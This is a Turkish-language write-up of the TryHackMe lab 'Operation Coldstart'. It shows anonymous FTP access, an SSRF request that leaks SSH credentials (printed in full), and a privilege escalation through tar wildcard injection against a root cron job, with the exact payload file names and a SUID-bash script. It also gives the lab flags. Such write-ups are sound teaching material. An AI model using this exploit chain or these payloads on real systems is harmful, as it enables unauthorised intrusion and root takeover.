# TryHackMe - Operation Coldstart Writeup

## Keşif

İlk olarak nmap taraması ile başlıyoruz:

```bash
nmap -sS -A -p- 10.114.141.161
```

<img width="805" height="596" alt="nmap" src="https://github.com/user-attachments/assets/5eb61782-602c-4472-b154-5361646ec3d3" />

Tarama sonucunda FTP servisinin açık olduğunu gördüm. Anonim erişim ihtimaline karşı direkt bağlanmayı denedim:

```bash
ftp 10.114.141.161
```

---

## FTP Enumerasyonu ve Dosya Analizi

FTP'ye bağlandığımda karşımda `backup.tar.gz` adında bir dosya vardı. Bunu `get` komutuyla kendi makineme çektim:

```bash
get backup.tar.gz
```

<img width="889" height="431" alt="getbackup" src="https://github.com/user-attachments/assets/ab6665f5-eeb7-4d87-bf25-31091f2effeb" />

Dosyayı açtım:

```bash
tar -xvf backup.tar.gz
```

Arşivin içinden şu dosyalar çıktı:

```
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

<img width="323" height="99" alt="backupçıkan" src="https://github.com/user-attachments/assets/efb00495-dac0-4d4c-80b2-67799ff16089" />

Bu dosyaları tek tek inceledim. `app.py` ve `README.md` içeriğinden anladığım kadarıyla sistemde şu dosya bulunuyordu:

```
/opt/voltlabs-preview/admin_notes.txt
```

Ayrıca kod, uygulamanın dahili olarak şu host üzerinde çalıştığını gösteriyordu:

```
kestrel.thm
```

Bu domaini tarayıcıdan ziyaret ettim.

---

## SSRF ile Bilgi Sızıntısı

<img width="1919" height="556" alt="site" src="https://github.com/user-attachments/assets/bd445515-6506-47ff-8a4f-3a4c9891afc1" />

Sayfanın kendisi "internal tool" ve "do not expose externally" gibi ibarelerle dahili kullanım için tasarlandığını söylüyordu, ama dışarıdan erişilebilir durumdaydı. Bu tarz "bir URL ver, içeriğini sana getireyim" şeklinde çalışan araçlar klasik bir **SSRF** adayıdır — sunucu, benim yerime kendi üzerindeki ya da dahili ağdaki kaynaklara istek atıyor.

Daha önce `app.py` kaynak kodundan öğrendiğim `/opt/voltlabs-preview/admin_notes.txt` dosyasının, uygulama içinde muhtemelen `/admin/notes` route'una karşılık geldiğini düşünerek bu adresi preview aracına verdim:

```
http://kestrel.thm/admin/notes
```

**Preview** butonuna bastığımda istek şu şekilde gönderildi:

```
http://kestrel.thm/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes
```

Sunucu, benim adıma bu URL'ye istek atıp sonucu bana geri döndürdü. Karşıma dahili bir not çıktı:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

<img width="1919" height="503" alt="site2" src="https://github.com/user-attachments/assets/e16385f3-afa6-4158-ab60-621e951c1941" />

Yani `/admin/notes` sayfası doğrudan dışarıdan korunuyor olabilirdi, ama SSRF açığı sayesinde uygulamanın **kendi üzerinden** bu içeriğe ulaşabildim. Not, doğrudan bana **staging ortamı için SSH kimlik bilgilerini** vermişti.

---

## SSH ile Giriş ve User Flag

Bulduğum kimlik bilgileriyle SSH üzerinden bağlandım:

```bash
ssh webdev@10.114.141.161
```

Giriş başarılı oldu ve ilk flag'i ele geçirdim:

```
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

---

## Cron Görev Keşfi

Sisteme eriştikten sonra her zaman yaptığım gibi ilginç dosyalara, servislere ve zamanlanmış görevlere bakmaya başladım. `/etc/cron.d/` altında dikkatimi çeken bir dosya vardı:

```bash
cat /etc/cron.d/voltlabs-backup
```

İçeriği şu şekildeydi:

```
# Volt Labs staging backup - runs as root

SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Bu son derece ilginçti. Root kullanıcısına ait bir cron görevi, her dakika `/opt/backups` dizini içinde şu komutu çalıştırıyordu:

```
tar czf /var/backups/uploads.tgz *
```

Burada dikkat çeken nokta, `tar` komutunun argüman olarak `*` (wildcard/joker karakter) kullanmasıydı. Bu, klasik bir **tar wildcard injection** fırsatı yaratıyor.

---

## Tar Wildcard Injection ile Privilege Escalation

`tar`, joker karakter genişlemesi (wildcard expansion) kötüye kullanıldığında komut satırı argüman enjeksiyonuna karşı savunmasızdır. Konuyla ilgili referans:

> HackTricks - Tar Wildcard Privilege Escalation

Mantık şu: shell, `*` karakterini dizindeki dosya adlarıyla genişletiyor. Eğer dizine `tar`'ın özel argüman olarak yorumlayacağı isimlerde (`--checkpoint=...` gibi) dosyalar koyarsam, `tar` bunları normal dosya değil komut satırı parametresi sanıp çalıştırıyor.

### Payload Hazırlama

Önce yedekleme dizinine geçtim:

```bash
cd /opt/backups
```

Root olarak çalıştırılacak zararlı script'i oluşturdum:

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
```

Ardından `tar`'ı kandıracak dosya adlarını oluşturdum:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Cron görevi çalıştığında bu dosya adları `tar` tarafından argüman olarak yorumlanacak ve `shell.sh`'ı root yetkisiyle tetikleyecekti.

### Cron'un Çalışmasını Bekleme

Yaklaşık bir dakika bekledim, çünkü cron görevi her dakika tetikleniyordu. Süre dolduğunda enjekte ettiğim argümanlar sayesinde `shell.sh`, root olarak çalıştırıldı. Bu da `/tmp/bash` dosyasını **SUID biti set edilmiş** halde oluşturdu.

Doğrulamak için:

```bash
ls -l /tmp/bash
```

Dosyanın artık root kullanıcısına ait olduğunu ve SUID bitiyle çalıştırılabilir durumda olduğunu gördüm.

---

## Root Erişimi ve Root Flag

SUID bitli bash'i çalıştırdım:

```bash
/tmp/bash -p
```

`-p` bayrağı, ayrıcalıkların (privileges) korunmasını sağlıyor. Doğrulamak için:

```bash
whoami
```

Çıktı:

```
root
```

Root kabuğunu elde etmiştim. Ardından flag'i okudum:

```bash
cd /root
cat flag.txt
```

Çıktı:

```
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

## Özet

| Aşama | Kullanılan Teknik |
|---|---|
| Keşif | Nmap full port scan |
| İlk Erişim | Anonim FTP üzerinden yedek dosyası ele geçirme |
| Host Tespiti | Kaynak kod analizi ile dahili host (`kestrel.thm`) tespiti |
| Bilgi Sızıntısı | SSRF (URL Preview Service) ile `/admin/notes` içeriğinin sızdırılması |
| Kimlik Bilgisi | Sızdırılan dahili nottaki SSH bilgileri |
| User Flag | SSH ile `webdev` kullanıcısı olarak giriş |
| Privilege Escalation | Root'un çalıştırdığı cron job üzerinden `tar` wildcard injection |
| Root Flag | SUID bash ile root shell |

Bu kutu, bir yedekleme arşivinin ne kadar konuşkan olabileceğini, kaynak kodda unutulmuş küçük bir referansın (dahili host adı) nasıl tüm zinciri açtığını ve "sadece dahili kullanım için" diye bırakılan bir SSRF aracının nasıl kimlik bilgisi sızıntısına dönüşebileceğini gösteren güzel bir örnekti. Sonundaki `tar` wildcard injection ise klasik ama hâlâ çok sık karşılaşılan bir misconfiguration.

---

*Bu writeup TryHackMe Operation Coldstart odası için hazırlanmıştır.*
